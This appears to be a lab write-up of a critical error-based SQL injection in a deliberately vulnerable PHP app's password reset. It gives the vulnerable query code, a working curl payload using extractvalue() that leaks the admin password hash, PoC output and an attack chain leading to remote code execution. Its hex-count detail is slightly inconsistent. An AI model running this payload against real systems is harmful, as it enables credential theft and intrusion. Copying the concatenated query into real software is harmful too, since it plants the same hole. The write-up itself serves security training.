# 05 — Error-based SQL injection in password reset, step 2

- **OWASP Top 10 (2021):** A03:2021 – Injection
- **Severity:** Critical
- **Difficulty:** Hard

## Where

`web/reset.php:41` — `POST /reset.php` with `step=2`, field `code`
(unauthenticated):

```php
$u = isset($_POST['username']) ? $_POST['username'] : '';
$c = isset($_POST['code']) ? $_POST['code'] : '';
$db = get_app_db();
$q = 'SELECT * FROM reset_codes WHERE username = \'' . $u . '\' AND code = \'' . $c . '\'';
$r = mysqli_query($db, $q);
```

## How it works (root cause)

`display_errors = On` in `conf/php.ini` makes PHP print MySQL errors into the
page. `extractvalue()` (or `updatexml()`) turns an arbitrary subquery result
into an XML/XPATH error message that is echoed back — error-based data
extraction without any boolean oracle. The error also leaks the **absolute
file path** of the script.

## Exploitation steps

1. First make step 2 reachable for a real user (any `username` works; the
   error fires regardless of whether a code row exists):

   ```bash
   curl -s -d "step=2&username=ulla&code=x' AND extractvalue(1,concat(0x7e,(SELECT password_md5 FROM users WHERE username='admin'))) -- " \
        http://localhost:8080/reset.php | grep -o 'XPATH[^<]*'
   ```

2. The payload:

   ```
   code = x' AND extractvalue(1,concat(0x7e,(SELECT password_md5 FROM users WHERE username='admin'))) --
   ```

   `0x7e` is `~` (an illegal XPATH char) which forces the error. For other
   data substitute the subquery, e.g.
   `SELECT CONCAT(username,0x3a,password_md5) FROM users LIMIT 1`,
   or chunk long output with `SUBSTRING(...,1,40)`.

## Working PoC (verified)

Response body contains:

```
XPATH syntax error: '~36f97e92ef3b4c1c6a41e46cc95db89' in /var/www/osedekommun/web/reset.php:42
```

(30 hex chars shown before the error is cut; chunk with `SUBSTRING` for the
remaining 2: `...db899` → full hash `36f97e92ef3b4c1c6a41e46cc95db899`.)

## Expected result / verification

- Admin's `password_md5` in the HTML error: `36f97e92ef3b4c1c6a41e46cc95db899`
  (md5 of `Aragorn2025!`, unsalted — see 22).
- Absolute server path disclosure in the same error.

## Attack chain

```
error-based SQLi (runs as osede_app — full DML on the DB)
  → dump any table (users, reset_codes, notes, messages)
  → admin password_md5 → crack md5 → admin login
  → upload.php (16) → RCE
The verbose error display itself is the enabler (24).
```

Why this is "hard": you must know that step 2's `code` field is injectable,
that errors are displayed, and that 5.5 exposes `extractvalue()`.
